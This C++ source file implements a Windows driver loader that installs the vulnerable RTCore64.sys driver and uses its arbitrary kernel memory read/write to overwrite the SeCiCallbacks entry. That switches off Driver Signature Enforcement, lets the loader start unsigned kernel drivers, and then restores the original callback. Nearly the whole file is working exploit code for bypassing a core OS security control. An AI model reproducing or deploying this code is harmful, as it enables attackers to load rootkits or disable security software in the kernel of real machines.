#include "DrvCore.h"
#include "ConfigManager.h"
#include "ResourceInstaller.h"
#include <iostream>
#include <vector>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "version.lib")

bool DrvLoader::Initialize() {
    originalCallback = ConfigManager::LoadOriginalCallbackFromRegistry();
    
    if (originalCallback) {
        std::wcout << L"[+] Found previous patch state in registry\n";
    } else {
        std::wcout << L"[*] No previous patch state found\n";
    }
    
    if (!symbolDownloader.Initialize()) {
        std::wcout << L"[-] Failed to initialize symbol downloader\n";
        return false;
    }
    
    return true;
}

void DrvLoader::Cleanup() {
    if (hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(hDriver);
        hDriver = INVALID_HANDLE_VALUE;
    }
}

bool DrvLoader::WriteMemory32(uint64_t address, uint32_t value) {
    if (hDriver == INVALID_HANDLE_VALUE) return false;
    
    RTC_MEMORY_WRITE writePacket{};
    writePacket.Address = address;
    writePacket.Size = sizeof(uint32_t);
    writePacket.Value = value;
    
    DWORD bytesReturned = 0;
    return DeviceIoControl(hDriver, RTC_IOCTL_MEMORY_WRITE, &writePacket, sizeof(writePacket), 
                          &writePacket, sizeof(writePacket), &bytesReturned, nullptr);
}

bool DrvLoader::WriteMemory64(uint64_t address, uint64_t value) {
    return WriteMemory32(address, static_cast<uint32_t>(value & 0xFFFFFFFF)) && 
           WriteMemory32(address + 4, static_cast<uint32_t>((value >> 32) & 0xFFFFFFFF));
}

std::optional<uint32_t> DrvLoader::ReadMemory32(uint64_t address) {
    if (hDriver == INVALID_HANDLE_VALUE) return std::nullopt;
    
    RTC_MEMORY_READ readPacket{};
    readPacket.Address = address;
    readPacket.Size = sizeof(uint32_t);
    
    DWORD bytesReturned = 0;
    if (!DeviceIoControl(hDriver, RTC_IOCTL_MEMORY_READ, &readPacket, sizeof(readPacket), 
                        &readPacket, sizeof(readPacket), &bytesReturned, nullptr))
        return std::nullopt;
    
    return readPacket.Value;
}

std::optional<uint64_t> DrvLoader::ReadMemory64(uint64_t address) {
    auto low = ReadMemory32(address);
    auto high = ReadMemory32(address + 4);
    if (!low || !high) return std::nullopt;
    
    return (static_cast<uint64_t>(*high) << 32) | *low;
}

std::optional<uint64_t> DrvLoader::GetNtoskrnlBase() {
    std::vector<LPVOID> drivers(1024);
    DWORD needed = 0;
    
    if (!EnumDeviceDrivers(drivers.data(), static_cast<DWORD>(drivers.size() * sizeof(LPVOID)), &needed))
        return std::nullopt;
    
    drivers.resize(needed / sizeof(LPVOID));
    
    for (const auto& driver : drivers) {
        WCHAR driverName[MAX_PATH];
        if (GetDeviceDriverBaseNameW(driver, driverName, MAX_PATH) && wcscmp(driverName, L"ntoskrnl.exe") == 0) {
            return reinterpret_cast<uint64_t>(driver);
        }
    }
    
    return std::nullopt;
}

bool DrvLoader::GetSymbolOffsets(uint64_t* seCiCallbacks, uint64_t* safeFunction) {
    WCHAR systemRoot[MAX_PATH];
    GetSystemDirectoryW(systemRoot, MAX_PATH);
    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
    
    // Check cache first
    if (ConfigManager::LoadOffsetsFromWindowsMiniPdb(seCiCallbacks, safeFunction)) {
        std::wcout << L"[+] Using cached offsets from mini-PDB\n";
        return true;
    }
    
    // Download symbols if necessary
    std::wcout << L"[*] Downloading kernel symbols...\n";
    if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) {
        std::wcout << L"[-] Failed to download symbols for ntoskrnl.exe\n";
        return false;
    }
    
    auto seCiOffset = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"SeCiCallbacks");
    auto zwFlushOffset = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"ZwFlushInstructionCache");
    
    if (!seCiOffset || !zwFlushOffset) {
        std::wcout << L"[-] Failed to get symbol offsets\n";
        return false;
    }
    
    *seCiCallbacks = *seCiOffset;
    *safeFunction = *zwFlushOffset;
    
    // Cache results
    ConfigManager::CreateWindowsMiniPdb(*seCiCallbacks, *safeFunction);
    
    return true;
}

std::optional<uint64_t> DrvLoader::GetKernelSymbolOffset(const std::wstring& symbolName) {
    WCHAR systemRoot[MAX_PATH];
    GetSystemDirectoryW(systemRoot, MAX_PATH);
    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
    
    if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) {
        return std::nullopt;
    }
    
    return symbolDownloader.GetSymbolOffset(ntoskrnlPath, symbolName);
}

bool DrvLoader::CheckDriverFileExists() {
    std::wstring driverPath = ConfigManager::GetDriverPath();
    if (GetFileAttributesW(driverPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        std::wcout << L"[*] Installing driver from embedded resource...\n";
        if (!ResourceInstaller::InstallDriverFromResource()) return false;
        
        if (GetFileAttributesW(driverPath.c_str()) == INVALID_FILE_ATTRIBUTES) return false;
    }
    return true;
}

bool DrvLoader::StopAndRemoveDriver() {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;
    
    SC_HANDLE hService = OpenServiceW(hSCM, L"RTCore64", SERVICE_ALL_ACCESS);
    if (hService) {
        SERVICE_STATUS serviceStatus;
        ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);
        DeleteService(hService);
        CloseServiceHandle(hService);
    }
    
    CloseServiceHandle(hSCM);
    return true;
}

bool DrvLoader::InstallAndStartDriver() {
    if (!CheckDriverFileExists()) return false;
    StopAndRemoveDriver();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;
    
    std::wstring driverPath = L"System32\\drivers\\RTCore64.sys";
    
    SC_HANDLE hService = CreateServiceW(hSCM, L"RTCore64", L"RTCore64", SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER, SERVICE_SYSTEM_START, SERVICE_ERROR_NORMAL,
        driverPath.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
    
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }
    
    StartServiceW(hService, 0, nullptr);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return true;
}

bool DrvLoader::TryLoadOffsetsFromCache(uint64_t* seCiCallbacks, uint64_t* safeFunction) {
    return ConfigManager::LoadOffsetsFromWindowsMiniPdb(seCiCallbacks, safeFunction);
}

bool DrvLoader::CheckDSEStatus(bool& isPatched) {
    std::wcout << L"\n[=== Checking DSE Status ===]\n\n";
    
    uint64_t seCiCallbacksOffset = 0;
    uint64_t zwFlushOffset = 0;
    bool usedCache = TryLoadOffsetsFromCache(&seCiCallbacksOffset, &zwFlushOffset);
    
    if (!usedCache) {
        std::wcout << L"[*] Downloading symbols...\n";
        WCHAR systemRoot[MAX_PATH];
        GetSystemDirectoryW(systemRoot, MAX_PATH);
        std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
        
        if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) return false;
        
        auto seCiOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"SeCiCallbacks");
        auto zwOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"ZwFlushInstructionCache");
        
        if (!seCiOpt || !zwOpt) return false;
        
        seCiCallbacksOffset = *seCiOpt;
        zwFlushOffset = *zwOpt;
        ConfigManager::CreateWindowsMiniPdb(seCiCallbacksOffset, zwFlushOffset);
    }
    
    if (!InstallAndStartDriver()) return false;
    
    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        StopAndRemoveDriver();
        return false;
    }
    
    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) {
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    uint64_t seCiCallbacks = *ntBase + seCiCallbacksOffset;
    uint64_t safeFunction = *ntBase + zwFlushOffset;
    uint64_t callbackAddress = seCiCallbacks + 0x20;
    
    auto currentCallback = ReadMemory64(callbackAddress);
    if (!currentCallback) {
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    isPatched = (*currentCallback == safeFunction);
    
    std::wcout << L"[+] DSE Status: " << (isPatched ? L"PATCHED" : L"ACTIVE") << L"\n";
    
    if (!usedCache) {
        ConfigManager::UpdateDriversIni(seCiCallbacksOffset, zwFlushOffset);
        // Build info logic retained but condensed
        std::wstring buildInfo = ConfigManager::GetWindowsBuildNumber();
        ConfigManager::SaveOffsetsToRegistry(seCiCallbacksOffset, zwFlushOffset, buildInfo);
    }
    
    Cleanup();
    StopAndRemoveDriver();
    return true;
}

bool DrvLoader::BypassDSEInternal() {
    uint64_t seCiOffset = 0, zwFlushOffset = 0;
    
    if (!TryLoadOffsetsFromCache(&seCiOffset, &zwFlushOffset)) {
        auto seCiOpt = GetKernelSymbolOffset(L"SeCiCallbacks");
        auto zwOpt = GetKernelSymbolOffset(L"ZwFlushInstructionCache");
        if (!seCiOpt || !zwOpt) return false;
        seCiOffset = *seCiOpt;
        zwFlushOffset = *zwOpt;
        ConfigManager::CreateWindowsMiniPdb(seCiOffset, zwFlushOffset);
    }
    
    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) return false;
    
    uint64_t seCiCallbacks = *ntBase + seCiOffset;
    uint64_t safeFunction = *ntBase + zwFlushOffset;
    uint64_t callbackToPatch = seCiCallbacks + 0x20;
    
    auto currentCallback = ReadMemory64(callbackToPatch);
    if (!currentCallback) return false;
    
    if (*currentCallback == safeFunction) return true;
    
    originalCallback = *currentCallback;
    if (!ConfigManager::SaveOriginalCallbackToRegistry(*originalCallback)) return false;
    
    return WriteMemory64(callbackToPatch, safeFunction);
}

bool DrvLoader::BypassDSE() {
    std::wcout << L"\n[=== DSE Bypass ===]\n";
    
    if (!InstallAndStartDriver()) return false;
    
    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        StopAndRemoveDriver();
        return false;
    }
    
    bool result = BypassDSEInternal();
    
    Cleanup();
    StopAndRemoveDriver();
    return result;
}

bool DrvLoader::LoadDriver(const std::wstring& driverPath, DWORD startType, const std::wstring& dependencies) {
    std::wcout << L"\n[=== Load Driver ===]\n";
    
    std::wstring normalizedPath = ConfigManager::NormalizeDriverPath(driverPath);
    std::wstring serviceName = ConfigManager::ExtractServiceName(normalizedPath);
    
    std::wcout << L"[*] Service: " << serviceName << L"\n";
    
    if (GetFileAttributesW(normalizedPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        std::wcout << L"[-] File not found: " << normalizedPath << L"\n";
        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
        return false;
    }
    
    // Step 1: Install RTCore
    if (!InstallAndStartDriver()) return false;
    
    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        StopAndRemoveDriver();
        return false;
    }
    
    // Step 2: Patch DSE
    if (!BypassDSEInternal()) {
        Cleanup();
        StopAndRemoveDriver();
        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
        return false;
    }
    
    // Step 3: Create and Start Target Service
    bool serviceSuccess = false;
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hService = CreateServiceW(hSCM, serviceName.c_str(), serviceName.c_str(),
            SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, startType, SERVICE_ERROR_NORMAL,
            normalizedPath.c_str(), nullptr, nullptr, dependencies.empty() ? nullptr : dependencies.c_str(), nullptr, nullptr);
            
        if (!hService && GetLastError() == ERROR_SERVICE_EXISTS) {
            hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
        }
        
        if (hService) {
            if (StartServiceW(hService, 0, nullptr) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
                std::wcout << L"[+] Service started successfully\n";
                serviceSuccess = true;
            } else {
                std::wcout << L"[-] Failed to start service (error: " << GetLastError() << L")\n";
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }
    
    // Step 4: Restore DSE
    RestoreDSEInternal();
    Cleanup();
    StopAndRemoveDriver();
    
    ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, serviceSuccess);
    return serviceSuccess;
}

bool DrvLoader::ReloadDriver(const std::wstring& driverPath) {
    std::wcout << L"\n[=== Reload Driver ===]\n";

    std::wstring normalizedPath = ConfigManager::NormalizeDriverPath(driverPath);
    std::wstring serviceName = ConfigManager::ExtractServiceName(normalizedPath);
    
    // Step 1: Install RTCore
    if (!InstallAndStartDriver()) return false;

    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        StopAndRemoveDriver();
        return false;
    }

    // Step 2: Stop target service if running
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
        if (hService) {
            SERVICE_STATUS_PROCESS ssp;
            DWORD needed;
            if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed)) {
                if (ssp.dwCurrentState == SERVICE_RUNNING) {
                     ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
                }
            }
            CloseServiceHandle(hService);
        }
        
        // Ensure service exists/recreated
        SC_HANDLE hCreate = CreateServiceW(hSCM, serviceName.c_str(), serviceName.c_str(),
             SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
             normalizedPath.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
        if (hCreate) CloseServiceHandle(hCreate);
        
        CloseServiceHandle(hSCM);
    }

    // Step 3: Patch DSE
    if (!BypassDSEInternal()) {
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }

    // Step 4: Start target service
    bool startSuccess = false;
    hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_START);
        if (hService) {
            if (StartServiceW(hService, 0, nullptr)) startSuccess = true;
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    // Step 5: Restore DSE
    RestoreDSEInternal();
    Cleanup();
    StopAndRemoveDriver();
    
    ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, SERVICE_DEMAND_START, startSuccess);
    return startSuccess;
}

bool DrvLoader::StopDriver(const std::wstring& serviceNameOrPath) {
    std::wcout << L"\n[=== Stop Driver ===]\n";
    
    std::wstring serviceName = ConfigManager::ExtractServiceName(serviceNameOrPath);
    std::wcout << L"[*] Service: " << serviceName << L"\n";
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        std::wcout << L"[-] Failed to open SCM\n";
        return false;
    }
    
    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hService) {
        std::wcout << L"[-] Service not found\n";
        CloseServiceHandle(hSCM);
        return false;
    }
    
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
        if (ssp.dwCurrentState == SERVICE_STOPPED) {
            std::wcout << L"[*] Service is already stopped\n";
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true;
        }
    }
    
    SERVICE_STATUS status;
    if (ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
        std::wcout << L"[+] Stop command sent\n";
    } else {
        std::wcout << L"[-] Failed to stop service (Error: " << GetLastError() << L")\n";
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return false;
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return true;
}

bool DrvLoader::RemoveDriver(const std::wstring& serviceNameOrPath) {
    std::wcout << L"\n[=== Remove Driver ===]\n";
    
    std::wstring serviceName = ConfigManager::ExtractServiceName(serviceNameOrPath);
    std::wcout << L"[*] Service: " << serviceName << L"\n";
    
    // Stop it first using internal logic or SCM calls
    StopDriver(serviceName);
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;
    
    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), DELETE);
    if (!hService) {
        std::wcout << L"[-] Service not found or access denied\n";
        CloseServiceHandle(hSCM);
        return false;
    }
    
    if (DeleteService(hService)) {
        std::wcout << L"[+] Service marked for deletion\n";
    } else {
        std::wcout << L"[-] Failed to delete service (Error: " << GetLastError() << L")\n";
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return true;
} 

bool DrvLoader::RestoreDSEInternal() {
    if (!originalCallback) return false;
    
    uint64_t seCiOffset = 0, zwFlushOffset = 0;
    if (!TryLoadOffsetsFromCache(&seCiOffset, &zwFlushOffset)) {
        auto seCiOpt = GetKernelSymbolOffset(L"SeCiCallbacks");
        if (!seCiOpt) return false;
        seCiOffset = *seCiOpt;
    }
    
    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) return false;
    
    uint64_t callbackAddress = *ntBase + seCiOffset + 0x20;
    
    auto currentCallback = ReadMemory64(callbackAddress);
    if (!currentCallback) return false;
    
    if (*currentCallback == *originalCallback) {
        ConfigManager::ClearPatchStateFromRegistry();
        return true;
    }
    
    if (WriteMemory64(callbackAddress, *originalCallback)) {
        ConfigManager::ClearPatchStateFromRegistry();
        return true;
    }
    
    return false;
}

bool DrvLoader::RestoreDSE() {
    std::wcout << L"\n[=== Restore DSE ===]\n";
    
    if (!originalCallback) {
        std::wcout << L"[-] No original callback state known\n";
        return false;
    }
    
    if (!InstallAndStartDriver()) return false;
    
    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        StopAndRemoveDriver();
        return false;
    }
    
    bool result = RestoreDSEInternal();
    
    Cleanup();
    StopAndRemoveDriver();
    return result;
}